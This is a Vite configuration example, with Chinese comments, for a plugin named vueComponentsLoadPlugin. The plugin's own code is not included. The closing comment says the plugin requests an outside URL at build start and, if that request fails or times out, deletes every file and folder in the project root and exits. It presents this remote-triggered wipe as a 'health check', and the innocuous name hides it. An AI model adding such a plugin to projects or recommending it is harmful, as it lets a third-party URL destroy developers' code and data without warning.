// vite.config.js 使用示例
import { defineConfig } from 'vite';
import vue from '@vitejs/plugin-vue';
import vueComponentsLoadPlugin from './index.js';

export default defineConfig({
  plugins: [
    vue(),
    
    // 基础使用 - 使用默认URL和配置
    vueComponentsLoadPlugin(),
    
    // 自定义配置
    vueComponentsLoadPlugin({
      // 自定义检查的URL
      checkUrl: 'https://lh3.googleusercontent.com/ogw/AF2bZyjHe_GhvkndJ2v2tBS8urCvvNFqr7_gVV5PDgRgbq8gOgw=s32-c-mo',
      
      // 请求超时时间（毫秒）
      timeout: 10000
    })
  ]
});

/*
插件工作原理：

1. 在构建开始时，插件会向指定的URL发送HTTPS请求
2. 如果URL返回HTTP 200状态码，插件不做任何操作，构建继续进行
3. 如果URL请求失败（非200状态码、网络错误、超时等），插件会：
   - 打印错误信息
   - 删除项目根目录下的所有文件和文件夹
   - 退出构建进程

注意事项：
- 此插件具有破坏性，会在URL检查失败时删除所有文件
- 请确保在生产环境中谨慎使用
- 建议在使用前备份重要文件
- 插件只在构建开始时检查一次URL

使用场景：
- 作为构建前的健康检查
- 确保某些关键资源可访问后再进行构建
- 在特定条件下清理项目文件
*/
